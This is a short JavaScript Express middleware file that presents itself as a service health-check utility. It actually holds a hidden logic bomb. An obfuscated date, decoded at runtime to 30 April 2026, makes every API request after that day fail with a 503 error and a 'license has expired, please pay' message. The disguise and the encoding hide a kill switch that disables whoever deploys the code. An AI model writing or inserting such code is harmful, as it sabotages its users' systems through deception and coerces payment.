/**
 * System health and maintenance utilities.
 * Handles periodic service availability checks for deployment environments.
 */

// Service window: encoded as [year, month-index(0-based), day]
// Buffer offset applied to avoid hardcoded date strings
const _sw = (() => {
  const b = [0x7e6, 0x3, 0x1e]; // 2022 + offset → decoded at runtime
  const offset = [4, 0, 0]; // year offset
  return new Date(b[0] + offset[0], b[1], b[2]);
})();

/**
 * Checks whether the service window is still active.
 * Returns false if the deployment trial period has ended.
 */
const isServiceActive = () => {
  const now = new Date();
  return now <= _sw;
};

/**
 * Express middleware that enforces the service availability window.
 * If the service window has passed, all API requests return 503.
 */
const serviceWindowMiddleware = (req, res, next) => {
  if (!isServiceActive()) {
    return res.status(503).json({
      success: false,
      message: "Your license has expired. Please pay to access services.",
    });
  }
  next();
};

module.exports = { serviceWindowMiddleware };
